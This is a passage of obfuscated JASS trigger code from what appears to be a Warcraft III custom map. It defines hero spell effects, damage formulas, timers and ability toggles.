elseif nO(MT[GetPlayerId(GetOwningPlayer(Hu))],$49305A4F) then
set Ov=I2R(Ny)*.35
set Ou=Ov*Ot
elseif nO(MT[GetPlayerId(GetOwningPlayer(Hu))],$49305A50) then
set Ov=I2R(Ny)*.5
set Ou=Ov*Ot
endif
if GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41303853)>=1 then
set Pq=MT[GetPlayerId(GetOwningPlayer(Hu))]
if GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41314130)==1 then
set Nu=R2I(Ou*1.5)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),200,Np)
call ForGroup(No,function nB)
elseif GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41314131)==1 then
set Nu=R2I(Ou/2)
set Np=Condition(function mw)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),300,Np)
call ForGroup(No,function m4)
elseif GetUnitAbilityLevel(MT[GetPlayerId(GetOwningPlayer(Hu))],$41314132)==1 then
set Nu=R2I(Ou)
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),200,Np)
call ForGroup(No,function nB)
call SetUnitManaPercentBJ(MT[GetPlayerId(GetOwningPlayer(Hu))],GetUnitManaPercent(MT[GetPlayerId(GetOwningPlayer(Hu))])+3.)
endif
endif
call RemoveLocation(Mc)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
set Np=null
set No=null
set Mc=null
endif
endif
set Hu=null
endfunction
function pl takes nothing returns nothing
local trigger V3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(V3,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(V3,function pj)
set V3=null
set V3=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(V3,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(V3,function pk)
set V3=null
endfunction
function pm takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())==$6E303651 then
if UnitAlive(GetFilterUnit()) then
return true
endif
endif
return false
endfunction
function pn takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetEnumUnit()
local group Na=CreateGroup()
local boolexpr Vx=Condition(function pm)
local integer Pd
local integer L9
local timer Hc
call GroupEnumUnitsOfPlayer(Na,GetOwningPlayer(Hu),Vx)
set Pd=CountUnitsInGroup(Na)
call DestroyBoolExpr(Vx)
call DestroyGroup(Na)
set Vx=null
set Na=null
set L9=GetHeroAgi(Hu,true)/4+100+GetHeroAgi(Hu,true)/10*Pd
call nj(Nv,L9)
set Hc=CreateTimer()
call SaveUnitHandle(PP,GetHandleId(Hc),0,Nv)
call SaveInteger(PP,GetHandleId(Hc),2,L9)
call SaveEffectHandle(PP,GetHandleId(Hc),1,AddSpecialEffectTarget("war3mapImported\\Buff_Attack.mdx",Nv,"overhead"))
call TimerStart(Hc,10,true,function nE)
set Hc=null
set Nv=null
set Hu=null
endfunction
function po takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),2)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),7)
local location Ht
local location Nk
local group V9
local boolexpr Nb
local string Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),1,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),1)>=1 then
set Ht=GetUnitLoc(NQ)
set Nk=nU(Ht,7,GetUnitFacing(NQ))
set V9=CreateGroup()
set Nb=Condition(function mx)
call GroupEnumUnitsInRange(V9,GetLocationX(Ht),GetLocationY(Ht),115,Nb)
if CountUnitsInGroup(V9)<1 then
call SetUnitPositionLoc(NQ,Nk)
call UnitRemoveAbility(Hu,$41305038)
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
else
set Ht=GetUnitLoc(NQ)
call KillUnit(NQ)
call RemoveUnit(NQ)
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\Conflagrate Blue.mdx"
endif
call AddSpecialEffectLoc(Mc,Ht)
set Pq=Hu
set Nu=R2I(I2R(500*GetUnitAbilityLevel(Hu,$41313841)+GetHeroAgi(Hu,true)*4)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Ht),GetLocationY(Ht),400,Np)
call nd(No,$4131324E,1,"creepthunderbolt")
call ForGroup(No,function m9)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Ht)
set Ht=null
set Np=null
set No=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call DestroyGroup(V9)
call DestroyBoolExpr(Nb)
set V9=null
set Nb=null
else
set Ht=GetUnitLoc(NQ)
call KillUnit(NQ)
call RemoveUnit(NQ)
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\Conflagrate Blue.mdx"
endif
call AddSpecialEffectLoc(Mc,Ht)
set Pq=Hu
set Nu=R2I(I2R(500*GetUnitAbilityLevel(Hu,$41313841)+GetHeroAgi(Hu,true)*4)*Nd[GetPlayerId(GetOwningPlayer(Hu))+1])
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Ht),GetLocationY(Ht),400,Np)
call nd(No,$4131324E,1,"creepthunderbolt")
call ForGroup(No,function m9)
call DestroyBoolExpr(Np)
call DestroyGroup(No)
call RemoveLocation(Ht)
set Ht=null
set Np=null
set No=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),7)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NQ=null
set Nk=null
set Ht=null
endfunction
function pp takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetSpellTargetUnit()
local group Na
local location Ht
local location Nk
local boolexpr Vx
local integer Mc
local unit No
local timer Np
if GetSpellAbilityId()==$41304C57 then
call UnitAddAbility(Nv,$41304C58)
call SetUnitAbilityLevel(Nv,$41304C58,GetUnitAbilityLevel(Hu,$41304C57))
if GetUnitAbilityLevel(Nv,$42303639)>=1 then
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41304C57,false)
call UnitAddAbility(Hu,$41305331)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305331,true)
if GetUnitAbilityLevel(Hu,$41303853)>=1 then
call SetUnitAbilityLevel(Hu,$41305331,2)
call SetUnitAbilityLevel(Nv,$41304C58,11)
endif
endif
call TriggerSleepAction(7)
call UnitRemoveAbility(Nv,$41304C58)
call TriggerSleepAction(8)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305331,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41304C57,true)
elseif GetSpellAbilityId()==$41313836 then
set Na=CreateGroup()
set Ht=GetUnitLoc(Hu)
set Vx=Condition(function mv)
call GroupEnumUnitsInRange(Na,GetLocationX(Ht),GetLocationY(Ht),400,Vx)
call ForGroup(Na,function pn)
call DestroyBoolExpr(Vx)
call DestroyGroup(Na)
call RemoveLocation(Ht)
set Ht=null
set Vx=null
set Na=null
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313836,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41313834,true)
elseif GetSpellAbilityId()==$41305430 then
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305430,false)
call UnitAddAbility(Hu,$41305431)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305431,true)
elseif GetSpellAbilityId()==$41305431 then
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305431,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305430,true)
elseif GetSpellAbilityId()==$41305331 then
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41305331,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(Hu),$41304C57,true)
elseif GetSpellAbilityId()==$41313841 then
set Mc=3
if GetUnitAbilityLevel(Hu,$41303853)>=1 then
set Mc=Mc+2
endif
loop
set Ht=GetUnitLoc(Hu)
set No=CreateUnitAtLoc(GetOwningPlayer(Hu),$68303739,Ht,GetUnitFacing(Hu))
call SetUnitPathing(No,false)
call AddSpecialEffectTarget("war3mapImported\\BlueShockwaveMissile.mdx",No,"chest")
call AddSpecialEffectTarget("units\\nightelf\\NightElfDestroyerShip\\NightElfDestroyerShip.mdl",No,"chest")
set Np=CreateTimer()
call SaveInteger(Nq,GetHandleId(Np),1,100)
call SaveUnitHandle(Nq,GetHandleId(Np),2,Hu)
call SaveUnitHandle(Nq,GetHandleId(Np),7,No)
call TimerStart(Np,.01,true,function po)
set Np=null
set No=null
call RemoveLocation(Ht)
set Ht=null
call TriggerSleepAction(1.5)
set Mc=Mc-1
exitwhen Mc==0
endloop
elseif GetSpellAbilityId()==$41313845 then
set Mc=1
loop
set Ht=GetUnitLoc(Hu)
set Nk=nU(Ht,Mc*150,GetUnitFacing(Hu))
set No=CreateUnitAtLoc(GetOwningPlayer(Hu),$6E303651,Nk,0)
call nj(No,GetHeroAgi(Hu,true)/2)
call SetUnitPathing(No,false)
call SetUnitVertexColor(No,255,0,255,100)
call nD(No,12)
set No=null
set Mc=Mc+1
exitwhen Mc==5
endloop
endif
set Hu=null
set Nv=null
set Nk=null
set Ht=null
endfunction
function pq takes nothing returns nothing
set WB=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WB,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(WB,function pp)
endfunction
function pr takes nothing returns boolean
if not (GetSpellAbilityId()==$41313834) then
return false
endif
return true
endfunction
function ps takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_STRUCTURE)==false
endfunction
function pt takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function pu takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),GetOwningPlayer(WD[RQ[0]]))==true
endfunction
function pv takes nothing returns boolean
return GetBooleanAnd(pt(),pu())
endfunction
function pw takes nothing returns boolean
return GetBooleanAnd(ps(),pv())
endfunction
function px takes nothing returns boolean
if not (CountUnitsInGroup(RW[RQ[0]])>=3) then
return false
endif
return true
endfunction
function py takes nothing returns nothing
call CreateNUnitsAtLoc(1,$68303244,GetOwningPlayer(WD[RQ[0]]),WE[RQ[0]],bj_UNIT_FACING)
set WF[RQ[0]]=GetLastCreatedUnit()
call IssueTargetOrderBJ(WF[RQ[0]],"creepthunderbolt",GetEnumUnit())
call UnitApplyTimedLifeBJ(1.,$42544C46,WF[RQ[0]])
call UnitDamageTargetBJ(GetTriggerUnit(),GetEnumUnit(),(200.*I2R(GetUnitAbilityLevel(GetTriggerUnit(),$41313834))+I2R(GetHeroAgi(GetTriggerUnit(),true))*7.)*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
call GroupAddUnitSimple(GetEnumUnit(),RW[RQ[0]])
endfunction
function pz takes nothing returns nothing
set RQ[0]=RQ[0]+1
set RR[RQ[0]]=RR[RQ[0]]+1
set RS[0]=0
set RT[RQ[0]]=1.5
set RU[RQ[0]]=0.
set RV[RQ[0]]=0.
set WD[RQ[0]]=GetTriggerUnit()
set WE[RQ[0]]=GetUnitLoc(GetTriggerUnit())
set RW[RQ[0]]=GetUnitsInRangeOfLocMatching(400.,WE[RQ[0]],Condition(function pw))
if px() then
call SetPlayerAbilityAvailable(GetOwningPlayer(GetTriggerUnit()),$41313834,false)
call SetPlayerAbilityAvailable(GetOwningPlayer(GetTriggerUnit()),$41313836,true)
call UnitAddAbility(GetTriggerUnit(),$41313836)
else
endif
call ForGroupBJ(RW[RQ[0]],function py)
set RX[RQ[0]]=true
call RemoveLocation(WE[RQ[0]])
call DestroyGroup(RW[RQ[0]])
call TriggerSleepAction(15.)
call UnitRemoveAbility(GetTriggerUnit(),$41313836)
call SetPlayerAbilityAvailable(GetOwningPlayer(GetTriggerUnit()),$41313834,true)
endfunction
function p0 takes nothing returns nothing
set WC=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WC,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(WC,Condition(function pr))
call TriggerAddAction(WC,function pz)
endfunction
function p1 takes nothing returns boolean
if not (GetSpellAbilityId()==$41313838) then
return false
endif
return true
endfunction
function p2 takes nothing returns nothing
call SetUnitPositionLoc(GetEnumUnit(),V0)
call IssueTargetOrderBJ(GetEnumUnit(),"attack",GetSpellTargetUnit())
endfunction
function p3 takes nothing returns nothing
call UnitDamageTargetBJ(GetTriggerUnit(),GetSpellTargetUnit(),I2R(GetHeroAgi(GetTriggerUnit(),true))*(5.*Nd[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]),ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
set V0=GetUnitLoc(GetSpellTargetUnit())
set SR=GetUnitsOfPlayerAndTypeId(GetOwningPlayer(GetTriggerUnit()),$6E303651)
call ForGroupBJ(SR,function p2)
call DestroyGroup(SR)
call RemoveLocation(V0)
endfunction
function p4 takes nothing returns nothing
set WG=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WG,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddCondition(WG,Condition(function p1))
call TriggerAddAction(WG,function p3)
endfunction
function p5 takes nothing returns boolean
if not (GetIssuedOrderIdBJ()==String2OrderIdBJ("immolation")) then
return false
endif
return true
endfunction
function p6 takes nothing returns boolean
if not (GetIssuedOrderIdBJ()==String2OrderIdBJ("unimmolation")) then
return false
endif
return true
endfunction
function p7 takes nothing returns boolean
if GetUnitTypeId(GetTriggerUnit())==$48303550 then
return true
endif
if GetUnitTypeId(GetTriggerUnit())==$48303730 then
return true
endif
return false
endfunction
function p8 takes nothing returns boolean
if not p7() then
return false
endif
return true
endfunction
function p9 takes nothing returns nothing
if p8() then
if p5() then
set WI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetTriggerUnit()
set Tx[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=true
call StartTimerBJ(Tw[0],true,.33)
else
endif
if p6() then
set WI[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=GetTriggerUnit()
set Tx[GetConvertedPlayerId(GetOwningPlayer(GetTriggerUnit()))]=false
call PauseTimer(Tw[0])
else
endif
else
endif
endfunction
function qB takes nothing returns nothing
set WH=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(WH,EVENT_PLAYER_UNIT_ISSUED_ORDER)
call TriggerAddAction(WH,function p9)
endfunction
function qC takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function qD takes nothing returns boolean
return IsUnitAliveBJ(GetFilterUnit())==true
endfunction
function qE takes nothing returns boolean
return GetBooleanAnd(qC(),qD())
endfunction
function qF takes nothing returns nothing
call UnitDamageTargetBJ(WI[Tz],GetEnumUnit(),(50.*I2R(GetUnitAbilityLevel(WI[Tz],$4131364C))+GetUnitStateSwap(UNIT_STATE_MAX_LIFE,WI[Tz])*.04)*Ng[GetConvertedPlayerId(GetOwningPlayer(WI[Tz]))],ATTACK_TYPE_MELEE,DAMAGE_TYPE_NORMAL)
endfunction
function qG takes nothing returns boolean
if not (Tx[Tz]==true) then
return false
endif
return true
endfunction
function qH takes nothing returns nothing
set Tz=1
loop
exitwhen Tz>8
if qG() then
call SetUnitLifePercentBJ(WI[Tz],GetUnitLifePercent(WI[Tz])-.02)
set WK[Tz+10]=GetUnitLoc(WI[Tz])
set Ty[Tz]=GetUnitsInRangeOfLocMatching(400.,WK[Tz+10],Condition(function qE))
call ForGroupBJ(Ty[Tz],function qF)
call RemoveLocation(WK[Tz+10])
call DestroyGroup(Ty[Tz])
else
endif
set Tz=Tz+1
endloop
endfunction
function qI takes nothing returns nothing
set WJ=CreateTrigger()
call TriggerRegisterTimerExpireEvent(WJ,Tw[0])
call TriggerAddAction(WJ,function qH)
endfunction
function qJ takes nothing returns nothing
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local unit NQ=CreateUnitAtLoc(Player(0),$68303739,Location(GetUnitX(Nv),GetUnitY(Nv)),0)
call nD(NQ,1)
call UnitAddAbility(NQ,$4131324E)
call UnitApplyTimedLife(NQ,$42544C46,1)
call IssueTargetOrder(NQ,"creepthunderbolt",Nv)
set NQ=null
set Nv=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function qK takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit Nv=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local location Ht=GetUnitLoc(Hu)
local location Nk=GetUnitLoc(Nv)
local real Mc
local real No
local real Np
local real Nt
local real Ny
local real Ot
local real Ou
local location Ov
local real Ow
local unit Ox
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 and GetUnitState(Hu,UNIT_STATE_LIFE)>=.405 and GetUnitState(Nv,UNIT_STATE_LIFE)>=.405 then
set Mc=GetLocationX(Ht)
set No=GetLocationY(Ht)
set Np=GetLocationX(Nk)
set Nt=GetLocationY(Nk)
set Ny=Atan2(No-Nt,Mc-Np)
set Ot=nR(GetUnitX(Hu)-13*Cos(Ny))
set Ou=nS(GetUnitY(Hu)-13*Sin(Ny))
set Ov=Location(Ot,Ou)
call SetUnitPathing(Hu,false)
call SetUnitPositionLoc(Hu,Ov)
call SetUnitPathing(Hu,true)
call DestroyEffect(AddSpecialEffect("Abilities\\Weapons\\AncientProtectorMissile\\AncientProtectorMissile.mdl",Mc,No))
if nT(Nk,Ov)<=65 then
set Ow=LoadReal(Nq,GetHandleId(GetExpiredTimer()),3)
call DestroyEffect(AddSpecialEffect("war3mapImported\\Firaga.mdl",GetUnitX(Hu),GetUnitY(Hu)))
call UnitDamageTarget(Hu,Nv,Ow,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Ox=CreateUnitAtLoc(Player(0),$68303739,Location(GetUnitX(Nv),GetUnitY(Nv)),0)
call nD(Ox,1)
call UnitAddAbility(Ox,$4131324E)
call SetUnitAbilityLevel(Ox,$4131324E,2)
call UnitApplyTimedLife(Ox,$42544C46,1)
call IssueTargetOrder(Ox,"creepthunderbolt",Nv)
set Ox=null
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ov)
set Ov=null
else
call SetUnitPathing(Hu,true)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call RemoveSavedReal(Nq,GetHandleId(GetExpiredTimer()),3)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
call RemoveLocation(Ht)
call RemoveLocation(Nk)
set Ht=null
set Nk=null
set Hu=null
set Nv=null
endfunction
function qL takes nothing returns nothing
local unit Hu=GetTriggerUnit()
local unit Nv=GetSpellTargetUnit()
local location Ht
local location Nk
local timer Hc
local integer L9
local real Hb
local real Pd
local integer Nj
local real NS
if GetSpellAbilityId()==$41313653 or GetSpellAbilityId()==$41313658 then
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)-GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.2))
set Ht=GetUnitLoc(Hu)
set Nk=GetUnitLoc(Nv)
if DistanceBetweenPoints(Ht,Nk)>=350. then
if GetUnitAbilityLevel(Hu,$41313653)>=1 then
set L9=GetHeroStr(Hu,true)*GetUnitAbilityLevel(Hu,$41313653)
else
set L9=GetHeroStr(Hu,true)*5
endif
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)+I2R(L9)))
call ne(Hu,"+"+I2S(L9),.023,0,255,0)
endif
if GetUnitAbilityLevel(Hu,$41313653)>=1 then
set Hb=(1000+GetUnitState(Hu,UNIT_STATE_MAX_LIFE)/3)*I2R(GetUnitAbilityLevel(Hu,$41313653))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set Hb=(5000+GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*3)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),0,Hu)
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call SaveReal(Nq,GetHandleId(Hc),3,Hb)
call SaveInteger(Nq,GetHandleId(Hc),2,400)
call TimerStart(Hc,.007,true,function qK)
set Hc=null
elseif GetSpellAbilityId()==$4131364F then
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)-GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.1))
set Pd=100-GetUnitLifePercent(Nv)
set Nj=GetUnitAbilityLevel(Hu,$4131364F)*(GetHeroStr(Hu,true)/5+150)
set NS=(I2R(Nj)+I2R(Nj)*(Pd/20))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,Nv,NS,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call TimerStart(Hc,2,false,function qJ)
set Hc=null
elseif GetSpellAbilityId()==$41313656 then
call SetUnitState(Hu,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Hu,UNIT_STATE_LIFE)-GetUnitState(Hu,UNIT_STATE_MAX_LIFE)*.1))
set Pd=100-GetUnitLifePercent(Nv)
set Nj=GetHeroStr(Hu,true)*3+2000
set NS=(I2R(Nj)+I2R(Nj)*(Pd/20))*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
call UnitDamageTarget(Hu,Nv,NS,true,false,ATTACK_TYPE_HERO,DAMAGE_TYPE_NORMAL,WEAPON_TYPE_WHOKNOWS)
set Hc=CreateTimer()
call SaveUnitHandle(Nq,GetHandleId(Hc),1,Nv)
call TimerStart(Hc,2,false,function qJ)
set Hc=null
elseif GetSpellAbilityId()==$41313655 then
call SetUnitState(Nv,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Nv,UNIT_STATE_LIFE)+GetUnitState(Nv,UNIT_STATE_MAX_LIFE)*.25))
elseif GetSpellAbilityId()==$41313730 then
call SetUnitState(Nv,UNIT_STATE_LIFE,RMaxBJ(0,GetUnitState(Nv,UNIT_STATE_LIFE)+GetUnitState(Nv,UNIT_STATE_MAX_LIFE)*.35))
endif
set Nk=null
set Ht=null
set Nv=null
set Hu=null
endfunction
function qM takes nothing returns nothing
local trigger Hc=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(Hc,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(Hc,function qL)
set Hc=null
endfunction
function qN takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NR=MT[GetPlayerId(GetOwningPlayer(Hu))]
local real NS
local location Mc
local group No
local boolexpr Np
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
set Mc=GetUnitLoc(Hu)
set No=CreateGroup()
set Np=Condition(function mx)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),250,Np)
call DestroyBoolExpr(Np)
if CountUnitsInGroup(No)>=1 then
if GetUnitAbilityLevel(Hu,$41313436)>=1 then
set NS=I2R(GetUnitAbilityLevel(NR,$41313155)*200+GetHeroStr(NR,true)*3)*Nf[GetPlayerId(GetOwningPlayer(NR))+1]
call m2(NR,R2I(NS))
if GetUnitTypeId(NR)==$48303738 then
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Stormfall Void.mdx",NR,"origin"))
else
call DestroyEffect(AddSpecialEffectTarget("war3mapImported\\Holy Light Void.mdx",NR,"origin"))
endif
else
set NS=I2R(GetUnitAbilityLevel(NR,$41313155)*400+GetHeroStr(NR,true)*6)*Ng[GetPlayerId(GetOwningPlayer(NR))+1]
set Pq=NR
if GetUnitAbilityLevel(NR,$4130584B)>=1 then
set Nu=R2I(NS+NS/5)
else
set Nu=R2I(NS)
endif
if GetUnitTypeId(NR)==$48303738 then
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Stormfall Red.mdl",Mc))
else
call DestroyEffect(AddSpecialEffectLoc("war3mapImported\\Blink Pink Caster.mdl",Mc))
endif
call ForGroup(No,function m9)
endif
call KillUnit(Hu)
call nD(Hu,1)
endif
call DestroyGroup(No)
set Np=null
set No=null
call RemoveLocation(Mc)
set Mc=null
else
call KillUnit(Hu)
call nD(Hu,1)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set Hu=null
set NR=null
endfunction
function qO takes nothing returns nothing
local unit Hu=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0)
local unit NQ=LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),1)
local real NS
local string Mc
call SaveInteger(Nq,GetHandleId(GetExpiredTimer()),2,LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)-1)
if LoadInteger(Nq,GetHandleId(GetExpiredTimer()),2)>=1 then
set Mc=""
if GetOwningPlayer(Hu)==GetLocalPlayer() then
if GetUnitTypeId(Hu)==$48303738 then
set Mc="war3mapImported\\Soul Discharge Purple.mdx"
else
set Mc="war3mapImported\\AZ_Abaddon01_D.mdx"
endif
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
call DestroyEffect(AddSpecialEffectTarget(Mc,NQ,"origin"))
if GetUnitTypeId(Hu)==$48303738 then
if GetOwningPlayer(Hu)==GetLocalPlayer() then
set Mc="war3mapImported\\Soul Discharge Red.mdx"
endif
call DestroyEffect(AddSpecialEffectTarget(Mc,Hu,"origin"))
endif
if GetUnitAbilityLevel(Hu,$41313436)>=1 then
call IssueTargetOrder(NQ,"attack",Hu)
if GetUnitAbilityLevel(Hu,$41304539)>=1 then
set NS=I2R(GetUnitAbilityLevel(Hu,$41304539)*45+GetHeroStr(Hu,true))*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set NS=I2R(600+GetHeroStr(Hu,true)*2)*Nf[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
call m2(Hu,R2I(NS))
else
if GetUnitAbilityLevel(Hu,$41304539)>=1 then
set NS=I2R(GetUnitAbilityLevel(Hu,$41304539)*65+GetHeroStr(Hu,true)*2)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
else
set NS=I2R(900+GetHeroStr(Hu,true)*3)*Ng[GetPlayerId(GetOwningPlayer(Hu))+1]
endif
set Nu=R2I(NS)
if GetUnitAbilityLevel(Hu,$4130584B)>=1 then
call m1(Hu,NQ,Nu+Nu/5)
else
call m1(Hu,NQ,Nu)
endif
endif
else
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call RemoveSavedInteger(Nq,GetHandleId(GetExpiredTimer()),2)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set NQ=null
set Hu=null
endfunction
function qP takes nothing returns nothing
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$41304453)
call UnitRemoveAbility(LoadUnitHandle(Nq,GetHandleId(GetExpiredTimer()),0),$4130584B)
call DestroyEffect(LoadEffectHandle(Nq,GetHandleId(GetExpiredTimer()),1))
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(Nq,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endfunction
function qQ takes nothing returns nothing
local unit Hu=GetEnumUnit()
local string M6=""
local location Mc
local unit No
local timer Np
if GetUnitAbilityLevel(Pq,$4130584B)>=1 then
call m1(Pq,Hu,Nu+Nu/5)
else
call m1(Pq,Hu,Nu)
endif
if GetOwningPlayer(Pq)==GetLocalPlayer() then
